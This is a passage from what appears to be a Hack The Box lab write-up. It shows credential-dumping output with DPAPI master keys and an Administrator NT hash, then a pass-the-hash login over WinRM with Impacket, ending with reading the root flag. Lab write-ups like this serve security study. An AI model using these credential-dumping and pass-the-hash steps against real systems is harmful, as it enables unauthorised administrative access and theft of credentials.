    GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
    MasterKey     : 95f668c165e7c0b3bd1f525330e5a647b9c9c8da7320c6fbdb4518a588bac996567e04f22b28d4f7a2abd33fafe0958522bca1aaa0de00f5edb7d6742065642d
    SHA1 MasterKey: b2bf2c648554143d6b28b3c06a1ece7e40867238
  [DPAPI]
    GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
    MasterKey     : e4778f7e1b8351eade5c49bb8e32503fbbaa705bb7e26eef5785e0a8200e31fcc2458a4db00e03aaabef34bd47900beee2d8a5bb73ddd904fbe279089a1ea718
    SHA1 MasterKey: 90b1c277630e507a8e28d7b260a53f21712c3f1d

  LUID: 0x14016d
  Session: 2 | LogonType: Unknown
  Username: Administrator
  Domain: WIN-0DG6SJAEUTA
  LogonServer: WIN-0DG6SJAEUTA
  LogonTime: 2026-05-09 14:07:14 UTC
  SID: S-1-5-21-2823729479-30462974-3865623546-500
  [MSV1_0]
    NT Hash : f29e9c0[REDACTED]
    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
  [DPAPI]
    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15
    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595

[*] 2 sessions, 1 NT hashes, 0 plaintext passwords
PS C:\w1ld>
```
{:.filename="Mimikatz, but VM"}

We can use the recovered `rc4` hash to `winrm` as `Administrator.`
```bash
~/htb/labs/checkpoint $ winrmexec.py 'Administrator@CHECKPOINT.HTB' -hashes :f29e[REDACTED]
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using CHECKPOINT.HTB
[*] '-port' not specified, using 5985
[*] '-url' not specified, using http://CHECKPOINT.HTB:5985/wsman
PS C:\Users\Administrator\Documents>
```
{:.filename="I'm In!"}

Let's move over to `max palmer`'s `Desktop`

```bash
PS C:\Users\max.palmer\Desktop> ls


    Directory: C:\Users\max.palmer\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---         6/15/2026   8:37 AM             34 root.txt 
```
{:.filename="Why are you here?"}

There we can find the `root` flag.